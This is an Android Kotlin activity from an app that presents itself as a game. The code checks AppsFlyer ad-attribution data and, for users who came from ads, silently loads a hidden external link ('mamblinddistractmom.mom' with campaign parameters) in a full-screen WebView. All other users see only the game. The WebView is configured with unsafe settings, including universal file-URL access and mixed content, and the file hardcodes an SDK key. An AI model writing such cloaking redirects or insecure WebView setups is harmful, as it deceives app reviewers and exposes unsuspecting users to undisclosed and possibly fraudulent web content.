package com.startegfin.financester

import android.app.DatePickerDialog
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import androidx.annotation.IdRes
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.startegfin.financester.databinding.ActivityGameBinding
import com.startegfin.financester.util.LottieUtil
import com.startegfin.financester.util.OneTime
import com.startegfin.financester.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.system.exitProcess


class GameActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = OneTime()

    private lateinit var binding          : ActivityGameBinding
    private lateinit var navController    : NavController
    private lateinit var sharedPreferences: SharedPreferences

    lateinit var lottie: LottieUtil

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initialize()
        lottie.show()
        initGlobalPref()
    }

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                finishAffinity()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityGameBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = LottieUtil(binding)
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        coroutine.launch(Dispatchers.Main) {
            navController.run {
                navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }
                    .also { setGraph(it, null) }
            }
        }
    }

    // Logic ----------------------------------------------------------------------------------

    private fun initGlobalPref() {
        sharedPreferences = getSharedPreferences("global", Context.MODE_PRIVATE)
        val networkValue  = sharedPreferences.getString("data", "null")

        binding.webView.apply {
            settings.apply {
                mixedContentMode = 0
                javaScriptEnabled = listOf(true).first()
                javaScriptCanOpenWindowsAutomatically = true
                allowFileAccess = true
                allowContentAccess = true
                useWideViewPort = true
                allowUniversalAccessFromFileURLs = true
                allowFileAccessFromFileURLs = true
                databaseEnabled = true
                loadWithOverviewMode = true
                domStorageEnabled = true
            }

            webViewClient = WebClient()

            try {
                if (networkValue.isNullOrText("null")) initAppsFly() else showUrl(networkValue!!)
            } catch (e: Exception) {
                log("error: ${e.message}")
                setStartDestination(R.id.libGDXFragment)
            }
        }
    }

    private fun showUrl(url: String) {
        coroutine.launch(Dispatchers.Main) {
            requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER

            binding.webView.apply {
                isVisible = true
                loadUrl(url)
            }
        }
    }

    private fun String?.isNullOrText(text: String): Boolean = (this == null || this == text)

    private fun initAppsFly() {
        val APPS_KEY = "nn8TUKjwPrWEQVRjJHf5Ag"
        val flag     = AtomicBoolean(true)

        AppsFlyerLib.getInstance().init(APPS_KEY, object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(conversion: MutableMap<String, Any>?) {
                coroutine.launch(Dispatchers.Main) {
                    try {
                        log("conversion: $conversion")
                        if (flag.getAndSet(false) && conversion != null) {
                            val afAd = conversion["af_ad"] as? String
                            val afAdSet = conversion["af_adset"] as? String

                            log("conversion: afAD = $afAd | afAdSet = $afAdSet")
                            if (afAd != null) {
                                val link = "https://mamblinddistractmom.mom/6FNKZwTh?finstad=$afAd&finsafset=$afAdSet"
                                log("link = $link")
                                sharedPreferences.edit().putString("data", link).apply()
                                showUrl(link)
                            } else setStartDestination(R.id.libGDXFragment)
                        } else setStartDestination(R.id.libGDXFragment)
                    } catch (e: Exception) {
                        log("error: ${e.message}")
                        setStartDestination(R.id.libGDXFragment)
                    }
                }
            }

            override fun onConversionDataFail(p0: String?) {
                flag.set(false)
                setStartDestination(R.id.libGDXFragment)
            }
            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
            override fun onAttributionFailure(p0: String?) {}
        }, this)

        AppsFlyerLib.getInstance().start(this, APPS_KEY, object : AppsFlyerRequestListener {
            override fun onSuccess() { log("AppsFly onSuccess") }
            override fun onError(p0: Int, p1: String) {
                log("AppsFly onError")
                setStartDestination(R.id.libGDXFragment)
            }
        })
    }

    inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {
            return false
        }

        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            lottie.hide()
        }
    }

    // Util --------------------------------------------------------------------------------

    fun showDatePickerDialog(oldDate: String, block: (String) -> Unit, blockCancel: () -> Unit) {
        coroutine.launch(Dispatchers.Main) {
            // Отримуємо поточну дату
            val calendar   = Calendar.getInstance()
            val dateFormat = SimpleDateFormat("dd.MM.yyyy", Locale.getDefault())
            dateFormat.parse(oldDate)?.let { calendar.time = it }

            val year  = calendar.get(Calendar.YEAR)
            val month = calendar.get(Calendar.MONTH)
            val day   = calendar.get(Calendar.DAY_OF_MONTH)

            // Створюємо DatePickerDialog
            val datePickerDialog = DatePickerDialog(
                this@GameActivity,

                R.style.CustomDatePickerDialog,
                null,
                year, month, day
            )

            // Налаштування назв кнопок
            datePickerDialog.setButton(DatePickerDialog.BUTTON_POSITIVE, "ОК") { dialog, which ->
                // Додатковий код, якщо потрібно обробити натискання на кнопку "ОК"
                val selectedYear = datePickerDialog.datePicker.year
                val selectedMonth = datePickerDialog.datePicker.month
                val selectedDay = datePickerDialog.datePicker.dayOfMonth

                // Обраний день, місяць і рік
                val selectedDate = String.format("%02d.%02d.%d", selectedDay, selectedMonth + 1, selectedYear)
                block(selectedDate) // Показуємо обрану дату
            }

            datePickerDialog.setButton(DatePickerDialog.BUTTON_NEGATIVE, "Отменить") { dialog, which ->
                // Додатковий код, якщо потрібно обробити натискання на кнопку "Скасувати"
                blockCancel()
            }

            // Показуємо діалог
            datePickerDialog.show()
            datePickerDialog.setCanceledOnTouchOutside(false)
        }
    }

    fun showInputDialog(text: String, hint: String, title: String, inputType: Int, block: (String) -> Unit, blockCancel: () -> Unit) {
        coroutine.launch(Dispatchers.Main) {
            // Створення EditText для введення тексту
            val editText = EditText(this@GameActivity)
            editText.setTextAppearance(R.style.CustomEditText)
            editText.hint = hint // Підказка для користувача
            editText.setText(text)

            editText.inputType = inputType

            // Створення AlertDialog
            AlertDialog.Builder(this@GameActivity, R.style.CustomAlertDialog)
                .setTitle(title)
                .setView(editText) // Додаємо EditText до діалогу
                .setPositiveButton("OK") { dialog, which ->
                    // Отримуємо введений текст
                    val inputText = editText.text.toString()
                    block(inputText)
                }
                .setNegativeButton("Отменить") { dialog, which ->
                    dialog.cancel() // Закриваємо діалог
                    blockCancel()
                }
                .show()
                .setCanceledOnTouchOutside(false)
        }
    }

}